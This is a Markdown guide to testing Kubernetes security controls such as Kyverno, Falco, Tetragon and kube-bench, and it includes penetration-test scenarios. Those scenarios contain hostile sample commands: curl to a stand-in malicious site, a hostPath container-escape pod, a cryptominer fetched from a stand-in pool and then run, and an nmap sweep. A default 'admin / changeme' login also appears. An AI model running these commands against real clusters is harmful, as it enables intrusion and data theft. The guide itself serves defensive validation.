# Testing Guide - Validate Security Controls

This guide shows how to test and demonstrate that security controls are working.

## Pre-Deployment Testing

### 1. Validate Terraform Configuration
```bash
cd terraform

# Check syntax
terraform fmt -check -recursive

# Validate configuration
terraform validate

# Check for security issues
tfsec .

# Plan without applying
terraform plan
```

**Expected**: No errors, security scan passes

### 2. Validate Kubernetes Manifests
```bash
# Validate YAML syntax
kubectl apply --dry-run=client -f policies/
kubectl apply --dry-run=client -f rbac/
kubectl apply --dry-run=client -f compliance/

# Check for deprecated APIs
kubectl apply --dry-run=server -f policies/
```

**Expected**: All manifests valid

## Post-Deployment Testing

### Security Control Tests

#### Test 1: Privileged Container Blocked (CIS 5.2.1, OWASP K01)
```bash
# Try to create privileged pod
kubectl run test-privileged --image=nginx --privileged=true

# Expected result: BLOCKED by Kyverno
# Error message: "Privileged mode is not allowed"
```

**Why this matters**: Privileged containers can escape to the host system

#### Test 2: Root User Blocked (CIS 5.2.6, OWASP K01)
```bash
# Try to create pod running as root
kubectl run test-root --image=nginx

# Expected result: BLOCKED by Kyverno
# Error message: "Running as root is not allowed"
```

**Why this matters**: Root users have excessive permissions

#### Test 3: Resource Limits Required (CIS 5.2.13, OWASP K01)
```bash
# Try to create pod without resource limits
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: test-no-limits
spec:
  containers:
  - name: nginx
    image: nginx
EOF

# Expected result: BLOCKED by Kyverno
# Error message: "CPU and memory limits are required"
```

**Why this matters**: Prevents resource exhaustion attacks

#### Test 4: Host Namespace Blocked (CIS 5.2.2, OWASP K01)
```bash
# Try to share host PID namespace
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: test-hostpid
spec:
  hostPID: true
  containers:
  - name: nginx
    image: nginx
EOF

# Expected result: BLOCKED by Kyverno
# Error message: "Sharing host namespaces is not allowed"
```

**Why this matters**: Host namespace access enables container escape

#### Test 5: Network Policy Enforcement (CIS 5.3.1, OWASP K07)
```bash
# Create two pods in different namespaces
kubectl create namespace test-ns-a
kubectl create namespace test-ns-b

kubectl run pod-a --image=nginx -n test-ns-a
kubectl run pod-b --image=nginx -n test-ns-b

# Try to communicate between namespaces
kubectl exec -n test-ns-a pod-a -- curl pod-b.test-ns-b.svc.cluster.local

# Expected result: BLOCKED by network policy
# Error message: Connection timeout or refused
```

**Why this matters**: Prevents lateral movement

#### Test 6: Unsigned Image Blocked (OWASP K02)
```bash
# Try to deploy unsigned image
kubectl run test-unsigned --image=myregistry/unsigned:latest

# Expected result: BLOCKED by Kyverno
# Error message: "Images must be signed"
```

**Why this matters**: Prevents malicious images

#### Test 7: Vulnerable Image Blocked (OWASP K02)
```bash
# Deploy image with known vulnerabilities
kubectl run test-vuln --image=nginx:1.14.0

# Expected result: BLOCKED by Trivy
# Error message: "Critical vulnerabilities found"
```

**Why this matters**: Prevents exploitation of known CVEs

#### Test 8: RBAC Least Privilege (CIS 5.1.1, OWASP K03)
```bash
# Check anonymous user permissions
kubectl auth can-i --list --as=system:anonymous

# Expected result: Minimal or no permissions
# Should NOT see: cluster-admin, delete, create (cluster-wide)
```

**Why this matters**: Prevents unauthorized access

#### Test 9: Secrets Encryption (CIS 3.1.1, OWASP K08)
```bash
# Check if secrets are encrypted
kubectl get secrets -n kube-system -o yaml | grep -i encryption

# Expected result: Shows encryption configuration
# Should see: KMS provider ARN
```

**Why this matters**: Protects sensitive data at rest

#### Test 10: Audit Logging (CIS 3.2.1, OWASP K05)
```bash
# Check if audit logs are enabled
aws logs describe-log-groups --log-group-name-prefix /aws/eks/

# Expected result: Shows log groups for all control plane components
# Should see: api, audit, authenticator, controllerManager, scheduler
```

**Why this matters**: Enables forensics and compliance

## Compliance Validation

### CIS Benchmark Audit
```bash
# Run kube-bench
kubectl apply -f compliance/kube-bench-job.yaml

# Wait for completion
kubectl wait --for=condition=complete --timeout=300s job/kube-bench -n security-tools

# View results
kubectl logs -n security-tools job/kube-bench

# Expected result: 100% pass rate (or very close)
# Look for: [PASS] indicators
```

**Scoring**:
- 95-100%: Excellent
- 90-94%: Good
- <90%: Needs improvement

### Policy Compliance Check
```bash
# Check all policies are active
kubectl get clusterpolicies

# Expected result: 20+ policies listed
# Status: Should all be "Ready"

# Check for violations
kubectl get policyreports -A

# Expected result: No violations (or only audit mode violations)
```

### Vulnerability Scan
```bash
# Check vulnerability reports
kubectl get vulnerabilityreports -A

# Expected result: Reports for all images
# Critical CVEs: Should be 0

# Detailed view
kubectl get vulnerabilityreports -A -o json | \
  jq '.items[] | select(.report.summary.criticalCount > 0)'

# Expected result: Empty (no critical vulnerabilities)
```

## Runtime Security Testing

### Test 11: Falco Alert Detection
```bash
# Trigger a Falco alert (shell in container)
kubectl run test-shell --image=nginx
kubectl exec -it test-shell -- /bin/bash

# Check Falco logs
kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=50

# Expected result: Alert logged
# Should see: "Shell spawned in container"
```

**Why this matters**: Detects suspicious behavior

### Test 12: Privilege Escalation Detection
```bash
# Try to escalate privileges (will fail but should be detected)
kubectl run test-escalate --image=nginx
kubectl exec test-escalate -- sudo su

# Check Tetragon logs
kubectl logs -n tetragon -l app.kubernetes.io/name=tetragon --tail=50

# Expected result: Escalation attempt logged and blocked
```

**Why this matters**: Prevents privilege escalation attacks

### Test 13: Network Exfiltration Detection
```bash
# Try to connect to external IP
kubectl run test-exfil --image=nginx
kubectl exec test-exfil -- curl http://malicious-site.com

# Check Falco logs
kubectl logs -n falco -l app.kubernetes.io/name=falco | grep -i "outbound"

# Expected result: Outbound connection logged
# Network policy should block if not explicitly allowed
```

**Why this matters**: Detects data exfiltration

## Monitoring & Observability

### Test 14: Prometheus Metrics
```bash
# Port-forward to Prometheus
kubectl port-forward -n monitoring svc/kube-prometheus-stack-prometheus 9090:9090

# Open browser: http://localhost:9090
# Query: kyverno_policy_results_total

# Expected result: Shows policy enforcement metrics
```

### Test 15: Grafana Dashboards
```bash
# Port-forward to Grafana
kubectl port-forward -n monitoring svc/kube-prometheus-stack-grafana 3000:80

# Open browser: http://localhost:3000
# Login: admin / changeme (change in production!)

# Expected result: Security dashboards visible
# Should see: Policy violations, vulnerability counts, etc.
```

### Test 16: Log Aggregation
```bash
# Port-forward to Loki
kubectl port-forward -n monitoring svc/loki 3100:3100

# Query logs
curl -G -s "http://localhost:3100/loki/api/v1/query" \
  --data-urlencode 'query={namespace="default"}' | jq

# Expected result: Logs from all pods
```

## Backup & Recovery Testing

### Test 17: Backup Verification
```bash
# Check Velero backups
kubectl get backups -n velero

# Expected result: Daily and weekly backups listed
# Status: Should be "Completed"

# Check backup storage
aws s3 ls s3://$(terraform output -raw backup_bucket)/

# Expected result: Backup files in S3
```

### Test 18: Restore Test
```bash
# Create test namespace and resources
kubectl create namespace test-restore
kubectl run test-pod --image=nginx -n test-restore

# Create backup
velero backup create test-backup --include-namespaces test-restore

# Delete namespace
kubectl delete namespace test-restore

# Restore from backup
velero restore create --from-backup test-backup

# Verify restoration
kubectl get pods -n test-restore

# Expected result: Pod restored successfully
```

## Penetration Testing Scenarios

### Scenario 1: Container Escape Attempt
```bash
# Try to mount host filesystem
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: escape-attempt
spec:
  containers:
  - name: attacker
    image: nginx
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
EOF

# Expected result: BLOCKED by Kyverno
# Error: "HostPath volumes are not allowed"
```

### Scenario 2: Crypto Mining Attempt
```bash
# Deploy pod that tries to mine crypto
kubectl run crypto-miner --image=nginx
kubectl exec crypto-miner -- curl -o miner http://mining-pool.com/miner
kubectl exec crypto-miner -- ./miner

# Expected result:
# 1. Falco detects suspicious download
# 2. Tetragon detects connection to mining pool
# 3. Process killed automatically
# 4. Alert sent to security team
```

### Scenario 3: Lateral Movement Attempt
```bash
# From compromised pod, try to scan network
kubectl run attacker --image=nginx
kubectl exec attacker -- apt-get update && apt-get install -y nmap
kubectl exec attacker -- nmap -sn 10.0.0.0/16

# Expected result:
# 1. Network policy blocks scanning
# 2. Falco detects nmap execution
# 3. Alert triggered
```

## Performance Testing

### Test 19: Policy Overhead
```bash
# Measure pod creation time with policies
time kubectl run test-perf --image=nginx

# Expected result: < 5 seconds
# Kyverno adds ~10ms overhead
```

### Test 20: Service Mesh Latency
```bash
# Deploy test service
kubectl apply -f - <<EOF
apiVersion: v1
kind: Service
metadata:
  name: test-svc
spec:
  selector:
    app: test
  ports:
  - port: 80
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: test
spec:
  replicas: 2
  selector:
    matchLabels:
      app: test
  template:
    metadata:
      labels:
        app: test
    spec:
      containers:
      - name: nginx
        image: nginx
EOF

# Measure latency
kubectl run curl --image=curlimages/curl -it --rm -- \
  sh -c 'for i in $(seq 1 100); do curl -w "%{time_total}\n" -o /dev/null -s test-svc; done' | \
  awk '{sum+=$1; count++} END {print "Average:", sum/count, "seconds"}'

# Expected result: < 50ms average
# Istio adds ~5ms overhead
```

## Automated Testing Script

```bash
#!/bin/bash
# Run all security tests

echo "Running Security Control Tests..."

# Test 1: Privileged container
echo "Test 1: Privileged container block"
kubectl run test-priv --image=nginx --privileged=true 2>&1 | grep -q "denied" && echo "✓ PASS" || echo "✗ FAIL"

# Test 2: Root user
echo "Test 2: Root user block"
kubectl run test-root --image=nginx 2>&1 | grep -q "denied" && echo "✓ PASS" || echo "✗ FAIL"

# Test 3: Resource limits
echo "Test 3: Resource limits required"
cat <<EOF | kubectl apply -f - 2>&1 | grep -q "denied" && echo "✓ PASS" || echo "✗ FAIL"
apiVersion: v1
kind: Pod
metadata:
  name: test-limits
spec:
  containers:
  - name: nginx
    image: nginx
EOF

# Test 4: Network policy
echo "Test 4: Network policy enforcement"
kubectl create namespace test-np 2>/dev/null
kubectl run pod-a --image=nginx -n test-np 2>/dev/null
kubectl run pod-b --image=nginx -n test-np 2>/dev/null
sleep 5
kubectl exec -n test-np pod-a -- timeout 2 curl pod-b 2>&1 | grep -q "timeout" && echo "✓ PASS" || echo "✗ FAIL"

# Test 5: CIS compliance
echo "Test 5: CIS Benchmark compliance"
kubectl apply -f compliance/kube-bench-job.yaml 2>/dev/null
kubectl wait --for=condition=complete --timeout=300s job/kube-bench -n security-tools 2>/dev/null
kubectl logs -n security-tools job/kube-bench 2>/dev/null | grep -q "PASS" && echo "✓ PASS" || echo "✗ FAIL"

# Cleanup
kubectl delete pod test-priv test-root test-limits 2>/dev/null
kubectl delete namespace test-np 2>/dev/null

echo "Testing complete!"
```

## Interview Demo Script

```bash
# 1. Show architecture
cat ARCHITECTURE-DIAGRAMS.md

# 2. Show compliance
bash scripts/validate-100-percent.sh

# 3. Demonstrate policy enforcement
echo "Trying to create privileged pod..."
kubectl run demo-priv --image=nginx --privileged=true
echo "BLOCKED! ✓"

# 4. Show monitoring
kubectl port-forward -n monitoring svc/kube-prometheus-stack-grafana 3000:80 &
echo "Grafana available at http://localhost:3000"

# 5. Show runtime security
kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20

# 6. Show compliance report
kubectl logs -n security-tools job/kube-bench | head -50

echo "Demo complete!"
```

## Troubleshooting Tests

### If Test Fails

1. **Check policy status**
   ```bash
   kubectl get clusterpolicies
   kubectl describe clusterpolicy <policy-name>
   ```

2. **Check admission webhooks**
   ```bash
   kubectl get validatingwebhookconfigurations
   kubectl get mutatingwebhookconfigurations
   ```

3. **Check Kyverno logs**
   ```bash
   kubectl logs -n kyverno -l app.kubernetes.io/name=kyverno
   ```

4. **Check events**
   ```bash
   kubectl get events --sort-by='.lastTimestamp'
   ```

## Success Criteria

All tests should:
- ✅ Block insecure configurations
- ✅ Detect suspicious behavior
- ✅ Log security events
- ✅ Maintain performance (<10% overhead)
- ✅ Pass CIS benchmark (>95%)
- ✅ Show zero critical vulnerabilities

If any test fails, review the specific control implementation and logs.
